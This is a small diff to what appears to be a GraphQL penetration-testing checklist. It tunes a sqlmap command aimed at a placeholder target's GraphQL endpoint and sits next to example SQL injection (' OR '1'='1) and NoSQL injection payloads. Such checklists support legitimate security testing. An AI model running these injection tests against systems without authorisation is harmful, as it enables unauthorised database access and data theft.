@@ -87,7 +87,7 @@
 ### Phase 5: Injection via GraphQL Variables
 
 #### SQL Injection Through Variables
-- `sqlmap -u '{target}/graphql' --data='{"query":"query{user(id:FUZZ){name}}","variables":{"id":"1"}}' --level=5 -p id`
+- `sqlmap -u '{target}/graphql' --data='{"query":"query{user(id:FUZZ){name}}","variables":{"id":"1"}}' --level=5 --technique=BEU --risk=1 -p id`
 - Manual test: `{"query":"query($id:String!){user(id:$id){name}}","variables":{"id":"1' OR '1'='1"}}`
 - NoSQL injection: `{"id": {"$gt": ""}}`
 
